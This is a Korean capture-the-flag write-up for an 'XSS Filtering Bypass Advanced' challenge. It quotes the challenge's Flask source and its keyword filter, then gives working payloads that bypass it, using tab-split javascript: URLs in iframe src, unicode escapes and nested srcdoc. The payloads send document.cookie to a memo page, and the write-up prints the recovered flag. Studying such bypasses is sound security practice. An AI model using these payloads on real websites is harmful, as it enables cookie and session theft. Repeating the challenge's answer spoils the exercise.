https://honey-push-30b.notion.site/XSS-Filtering-Bypass-Advanced-5c1e4eb28ba8442aaea07fa22391c691

# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7041f9d0-2dec-4a8c-a059-92a6d9bd316b/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

Xss Filtering Bypass Advanced 문제의 접속 정보와 문제파일을 다운로드 받을 수 있다. 문제파일을 다운로드 받으면 [app.py](http://app.py) 파일을 받을 수 있는데 이 파일의 코드는 아래와 같다.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            return "filtered!!!"

    advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"] 
    for f in advanced_filter:
        if f in text.lower():
            return "filtered!!!"

    return text

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    param = xss_filter(param)
    return param

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'

memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)

app.run(host="0.0.0.0", port=8000)
```

이 문제는 XSS Filtering Bypass 처럼 flag 페이지에서 내가 원하는 스크립트를 작성하여 vuln페이지에서 실행되도록 하는 것이다. 

그리고 내가 작성한 스크립트가 vuln페이지에서 실행되는 이유는 vuln페이지는 내가 작성한 스크립트를 필터링 후 그대로 출력해주기 때문이며 (return param) 이 vuln페이지에서 실행되는 스크립트는 127.0.0.1의 cookie에 저장된 flag값을 가지고 실행된다.(즉 cookie 값을 알아내면 flag다.)

근데 이 때 XSS Filtering Bypass와 달라진점은 필터링의 종류가 늘어났다는 것이다.

```python
def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            return "filtered!!!"

    advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"] 
    for f in advanced_filter:
        if f in text.lower():
            return "filtered!!!"

    return text
```

필터링이 된 목록을 보면 script,on,javscript, window, self, this, document, location,(,),&#이다.

필터링 값이 들어있으면 없애는 방식으로 치환해주던 XSS Filtering과는 다르게 script, on, javascript가 들어있는 것 자체가 안된다.

따라서 <script>와 같은 태그는 불가능 하고 on이 불가능 하므로 img onerror, input onfocus, img onload와 같은 핸들러도 일단 예외가 된다. 그래서 iframe을 사용하고자 했다.

javascript는 URL 로드 시 자바스크립트를 실행할 수 있게 해주는 스키마로 필터링 조건이지만 iframe의 src 속성(URL을 불러오는 속성)을 통해 넣으면 브라우저들이 URL을 사용할 때 거치는 과정인 정규화 (탭과 같은 것을 제거하고 읽음)과정을 통해 우회할 수 있다.

advanced_filter를 보면 window를 금지하고 이를 대체할 수 있는 self,this또한 금지하고 있다. 하지만 javascript 스키마 안에 들어있기 때문에 스크립트 안에서 사용할 수 있는 유니코드(\u0063,c)방식을 사용하여 우회할 수도 있고, 태그안의 속성에 들어가 있기 때문에 HTML ENTITY ENCODING(&#99;)을 통하여 우회할 수도 있다. 하지만 &#은 필터링 조건이기 때문에 HTML ENTITY ENCODING 대신 유니코드 방식을 사용한다.

필터링 을 고려하지 않고 공격하되 iframe을 통해 공격을 하려면

<iframe src= “javascript:location.href=’/memo?memo=’+document.cookie”>가 된다.

여기서 이제 필터링을 우회해주자. javascript는 정규화 방식을 통해서 우회해준다(스키마이기 때문에 스크립트 안에서 사용하는 유니코드 방식의 우회는 안된다). 이때 주의해줘야 하는 점은 tab을 \t로 해주지 않고 진짜 tab키를 이용하여 해줘야 한다는 점이다.

location을 우회할 때도 정규화방식을 그대로 사용해서 우회할 수 있지만 유니코드 방식을 이용해 우회했다.이 때 on또한 필터링 조건에 들어가므로 이를 유의하여 맨 마지막 o를 유니코드 방식을 통해 우회 했다.

![exploit1.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e379c3d5-37dc-4c95-b72a-99d638ee9854/exploit1.png)

document도 마찬가지로 유니코드 방식을 통해 우회 해줄 수 있다. 즉 결과는 다음과 같다.

`<iframe src="javasc	ript:locati\u006fn.href = '/memo?memo=' + \u0064ocument.cookie">`

![exploit.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b7064784-9d2d-4b92-9ef2-011cd7ae90be/exploit.png)

정규화만 이용해서 우회하는 것도 가능하다.

`<iframe src="javasc	ript:locatio	n.href='/memo?memo='+d	ocument.cookie">`

![flag.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8549a5c3-06f4-477e-8f43-f9615ec216f6/flag.png)

그러면 flag값 `flag=DH{e8140ed5b0770088dd2012e1c9dfd4b4}` 를 획득할 수 있다.

# 문제에서 삽질했던 점

### 정규화 할 때 \1, \4, \t를 어떻게 넣어야하는지 제대로 이해하지 못한점

src 은 URL을 로드해주는 속성이므로 URL을 로드할 때 브라우저가 특수문자들을 제거하고 읽어들이는 점을 이용해서 javascript:스키마를 이용하되 정규화를 사용해 줄 수 있다.(src로 넣어주는 값들은 URL이기 때문)

단 이때 GET으로 보내줄때는 %0a(줄바꿈),%09(tab) 과 같이 인코딩 해서 보내줘야하고

`<iframe src="javascri%09pt:locatio%09n.href='/memo?memo='%2bdocume%09nt.cookie">`

POST로 보내줄때는 tab키를 직접 입력해서 보내줘야 한다.

`<iframe src="javasc	ript:locatio	n.href = '/memo?memo=' + docume	nt.cookie">`

### iframe 태그의 src와 srcdoc의 차이점을 제대로 이해하지 못한점

iframe태그의 src는 URL로 불러들이는 속성이다. 따라서 URL이기 때문에 정규화가 사용이 가능한 것이고 srcdoc는 태그를 삽입하는 것이므로(URL이 아님) 정규화를 넣어줄 수 없다. 

단 둘다 속성에 값을 넣어주는 것이기 때문에 HTML ENTITY ENCODING은 가능한듯하다.

### &#을 우회하기 위해 &amp;#99;로 변경하였는데 어째서 되지 않았을까?

<iframe src ="javas&amp;#99;ript:locati&amp;#111;n.href='/memo?memo=hi'">

이는 아마 내부적으로 들어갈 때 디코딩이 되면서 &amp;#111;이 &#111;이 되어 &# 필터링에 걸리는 듯 하다.. 왜 그렇게 생각했냐면 iframe srcdoc를 이중으로 사용한 사람들은 이 방식으로 우회하는 것을 성공했기 때문이다.

`<iframe srcdoc="<iframe srcdoc=\'<&#83;cript>l&#x6f;cati&#x6f;n=/memo?memo=+d&#x6f;cument.cookie</&#83;cript>\'>">`

이렇게 이중으로 사용하면 이중 디코딩이 되면서 우회가 가능하다고 한다.

### iframe 태그를 사용했는데 parent.document.cookie를 사용해야하는 것 아니야?

Parent를 달아주지 않아도 , 달아주어도 DH 플래그 값이 나온다… 아마 read_url을 거쳐서 실행이 되는데 이 때 cookie값을 재설정 해주기 때문이 아닐까 추측해본다.
